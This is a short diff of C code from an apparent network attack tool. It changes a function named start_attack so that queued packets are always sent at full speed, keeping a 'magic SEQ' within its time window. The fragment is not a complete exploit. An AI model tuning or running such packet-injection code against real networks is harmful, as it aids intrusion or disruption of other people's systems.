@@ -479,7 +479,7 @@ void start_attack(AS_context *ctx) {
     IPAddresses *requesters = IPAddressesPtr(ctx, tags[1]);
     int ts = 0;
     OutgoingPacketQueue *optr = NULL;
-    int fast = 0;
+    int fast = 1;
     int skip = 0;
 
     while (1) {
@@ -501,7 +501,7 @@ void start_attack(AS_context *ctx) {
         }
 
         // push packets as quickly as possible if it takes more  than 1 second to send them all... otherwise our magic SEQ falls out of its time slice
-        if ((time(0) - ts) > 1) fast=1;
+        //if ((time(0) - ts) > 1) fast=1;
 
         // push all packets together
         if (optr) {
